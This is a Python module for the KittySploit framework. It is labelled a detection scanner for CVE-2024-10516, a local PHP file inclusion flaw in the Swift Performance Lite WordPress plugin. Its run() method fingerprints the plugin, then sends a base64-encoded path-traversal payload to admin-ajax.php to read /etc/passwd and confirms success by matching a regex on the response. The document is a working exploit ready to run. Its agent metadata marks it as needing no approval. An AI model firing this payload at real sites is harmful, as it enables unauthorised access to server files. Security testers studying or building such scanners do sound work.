#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability in Swift Performance Lite before version 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Swift Performance Lite < 2.3.7.2 - Local PHP File Inclusion Detection',
        'description': "A vulnerability in Swift Performance Lite before version 2.3.7.2 allows unauthenticated attackers to perform local PHP file inclusion via the 'ajaxify' parameter. This can lead to arbitrary code execution on the server.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wp', 'wp-plugin', 'wordpress', 'swift-performance', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/RandomRobbieBF/CVE-2024-10516',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-10516',
        ],
        'cve': 'CVE-2024-10516',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins/swift-performance-lite',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=swift_performance_ajaxify&data=WyJ0ZW1wbGF0ZS1wYXJ0IiwibnVsbCIsIi4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QiXQ==\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='Swift Performance Lite < 2.3.7.2 - Local PHP File Inclusion detected', path=path)
            return True
        return False

